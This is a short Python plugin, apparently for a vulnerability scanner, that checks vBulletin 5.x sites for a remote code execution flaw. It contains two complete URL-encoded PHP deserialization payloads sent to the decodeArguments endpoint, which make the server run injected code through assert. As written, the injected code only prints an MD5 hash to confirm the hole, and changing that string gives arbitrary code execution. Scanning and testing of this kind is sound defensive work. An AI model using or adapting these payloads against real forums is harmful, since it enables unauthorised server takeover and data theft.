#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = vBulletin 5.x.x ce
#___From___ = http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/

def assign(service, arg):
    if service == 'vbulletin':
        return True, arg
def audit(arg):
    payloads = ["ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D",
                "ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D"]
    for payload in payloads:
        target = arg + payload
        code, head, body, errcode, final_url = curl.curl2(target);
        if 'c4ca4238a0b923820dcc509a6f75849' in body:
            security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('vbulletin', 'http://www.example.com/')[1])